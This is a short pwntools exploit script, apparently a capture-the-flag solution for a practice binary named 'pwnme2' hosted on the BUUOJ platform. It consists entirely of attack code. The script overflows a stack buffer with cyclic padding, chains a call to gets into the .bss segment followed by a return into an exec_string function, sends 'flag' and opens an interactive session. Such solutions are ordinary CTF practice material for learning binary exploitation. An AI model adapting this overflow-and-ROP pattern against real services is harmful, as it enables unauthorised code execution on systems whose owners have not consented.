from pwn import *


# p = process("./pwnme2")
p = remote("node4.buuoj.cn", 29575)
pro = ELF("./pwnme2")


gets_p = pro.plt["gets"]
exec_string = 0x080485CB
bss_addr = 0x0804A060

pad = cyclic(0x6c+0x4)
pad += p32(gets_p)+p32(exec_string)+p32(bss_addr)
p.sendline(pad)
p.sendline("flag")

p.interactive()


